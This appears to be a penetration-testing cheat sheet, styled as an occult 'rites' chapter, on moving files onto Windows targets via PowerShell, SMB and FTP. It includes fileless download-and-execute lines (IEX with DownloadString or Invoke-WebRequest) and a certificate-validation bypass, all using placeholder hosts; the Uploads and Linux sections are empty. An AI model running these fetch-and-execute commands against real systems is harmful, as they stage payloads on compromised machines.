# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> *"No summoning may begin until the runes are in place."*

---

<details>
  <summary><strong>🪟 Windows</strong></summary>
  <details>  
    <summary><strong>📥 Downloads</strong></summary>
      <details>
        <summary><strong>PowerShell DownloadFile Method</strong></summary>
          Sync  
          ```powershell
          (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
          ```
            Async  
            ```powershell
            (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
            ```
        </details>

  <details>
    <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>

  Defaulr  
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
  ```

  Pipeline input  
  ```powershell
  (New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
  ```
  </details>

  <details>
    <summary><strong>PowerShell Invoke-WebRequest</strong></summary>

  Default  
  ```powershell
  Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
  ```

  ByPass Internet Explorer Error  
  ```powershell
  Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
  ```

  ByPass SSL/TLS Error  
  ```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  # Command to download the file
  ```

  </details>

  <details>
    <summary><strong>SMB Downloads</strong></summary>

  **Default**
  
  Create the SMB Server in Linux
  ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare
  ```
  Download using CMD in Windows
  ```cmd
  copy \\<IP>\share\<FILE>
  ```
  
  **Using credentialts**

  Create the SMB Server in Linux
  ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
  ```
  Mount the SMB Server in Linux
  ```cmd
  net use n: \\<IP>\share /user:<USER> <PASSWORD>
  copy n:\<FILE>
  ```

  </details>

<details>
    <summary><strong>FTP Downloads</strong></summary>  
    
  **Upload file**  
  
  Setting up a Python3 FTP Server in Linux
  ```bash
  sudo pip3 install pyftpdlib
  sudo python3 -m pyftpdlib --port 21
  ```

  **Option 1: Download file using Powershell**
  ```powershell
  (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<OUTPUT FILE>')
  ```

  **Option 2: Download file using CMD**  
  
  Create a Command File for the FTP Client and Download the Target File
  ```cmd
  echo open <IP> > ftpcommand.txt
  echo USER anonymous >> ftpcommand.txt
  echo binary >> ftpcommand.txt
  echo GET <FILE> >> ftpcommand.txt
  echo bye >> ftpcommand.txt
  ftp -v -n -s:ftpcommand.txt
  ```
  Once in FTP...
  ```cmd
  open <IP>
  USER anonymous
  GET <FILE>
  bye
  ```
  Back in CMD...
  ```cmd
  more <FILE>
  ```
---
  
  </details>
  </details>
    <summary><strong>📤 Uploads</strong></summary>
      <details>
      </details>
</details>

---

<details>
  <summary><strong>🐧 Linux</strong></summary>
</details>

---
